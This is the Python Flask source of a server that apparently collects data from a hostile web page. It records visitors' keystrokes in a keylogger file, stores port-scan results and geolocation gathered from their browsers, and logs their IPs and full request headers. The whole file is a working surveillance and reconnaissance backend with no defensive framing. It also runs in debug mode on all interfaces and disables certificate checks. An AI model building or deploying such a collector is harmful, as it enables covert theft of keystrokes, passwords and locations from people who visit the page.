from flask import Flask, request, jsonify, render_template
import json
import requests
import os

app = Flask(__name__)

# Create the logs directory path
log_directory = "logs"

# Create the directory if it does not exist
if not os.path.exists(log_directory):
    os.makedirs(log_directory)

# Update the file paths
general_log_file = os.path.join(log_directory, 'logs.json')
port_scan_file = os.path.join(log_directory, "scan.json")
keylogger_file = os.path.join(log_directory, "keylogger.json")
geo_location_file = os.path.join(log_directory, "geolocation.json")

@app.route('/')
def index():    
    # Return the main page template
    return render_template('index.html')

@app.route('/admin')
def nmap():
    # Render the admin page
    return render_template('admin.html')

def ip_lookup(ip="127.0.0.1"):
    # IP address lookup function
    url = "https://api.incolumitas.com/"
    params = {
        'q': ip
    }
    
    response = requests.get(url, params=params, verify=False)

    # If the request is successful
    if response.status_code == 200:
        lookup = response.json()  # Parse the JSON response
    else:
        print(f"Lookup unsuccessful, status code: {response.status_code}")

    return lookup

@app.route('/log', methods=['POST'])
def log_data():
    # Get the incoming JSON data
    data = request.json
    
    client_ip = request.remote_addr  # Get the IP address of the request
    request_method = request.method  # Get the request method (GET, POST, etc.)
    request_url = request.url  # Get the request URL
    request_headers = dict(request.headers)  # Get the request headers

    # Prepare the log entry
    log_entry = {
        "client_ip": client_ip,
        "request_method": request_method,
        "request_url": request_url,
        "request_headers": request_headers,
        "js_data": data,
        #"ip_lookup": ip_lookup(client_ip)  # don't need
    }

    # Write the log entry to the file
    with open(general_log_file, "a") as f:
        json.dump(log_entry, f, indent=4)
        f.write("\n")

    return jsonify({"status": "success"}), 200

@app.route('/log-keypress', methods=['POST'])
def logger():
    # Get the incoming JSON data
    data = request.json
    client_ip = request.remote_addr  # Get the IP address of the request

    # Add the IP address to the data
    data_with_ip = {
        "ip": client_ip,
        **data
    }

    # Write the keypress logs to the file
    with open(keylogger_file, "a") as f:
        json.dump(data_with_ip, f)
        f.write("\n")

    return jsonify({"status": "success"}), 200

@app.route('/ports', methods=['POST'])
def scan_results():
    # Get the incoming JSON data
    data = request.json
    if not data or 'ip' not in data or 'open_ports' not in data:
        return jsonify({"error": "Invalid data"}), 400

    ip = data['ip']
    open_ports = data['open_ports']

    # Save the results to the file
    with open(port_scan_file, 'a') as file:
        file.write(f"IP: {ip} - Open Ports: {', '.join(map(str, open_ports))}\n")

    return jsonify({"status": "success"}), 200

# Endpoint for handling geolocation data
@app.route('/log-geolocation', methods=['POST'])
def log_geolocation():
    data = request.get_json()  # Get JSON data from the request
    
    if data:
        client_ip = request.remote_addr
        
        # Add the IP address to the data
        geo_data_with_ip = {
            "ip": client_ip,
            **data
        }

        with open(geo_location_file, 'a') as f:
            f.write(json.dumps(geo_data_with_ip) + '\n')
        return jsonify({'status': 'success'}), 200
    return jsonify({'status': 'error', 'message': 'No data received'}), 400

if __name__ == '__main__':
    # Start the Flask application
    app.run(host="0.0.0.0", port=5000, debug=True)
